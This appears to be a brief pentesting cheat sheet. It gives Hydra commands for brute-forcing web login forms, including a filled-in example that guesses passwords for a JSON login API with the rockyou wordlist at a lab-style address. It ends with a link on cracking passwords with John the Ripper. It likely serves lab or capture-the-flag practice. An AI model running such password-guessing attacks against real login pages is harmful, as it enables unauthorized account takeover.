# Hydra

`hydra -l <USER> -p <PASSWORD> <IP_ADDRESS> http-post-form "<LOGIN_PAGE>:<REQUEST_BODY>:<ERROR_MESSAGE>"`

## JSON Payload

`hydra -l "root@dasith.works" -P "/usr/share/wordlists/rockyou.txt" -s 3000 10.129.244.81 http-post-form "/api/user/login:{\"email\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:S=Password is wrong:H=content-type: application/json"`

# Cracking

## John

https://vk9-sec.com/cracking-password-john-the-ripper/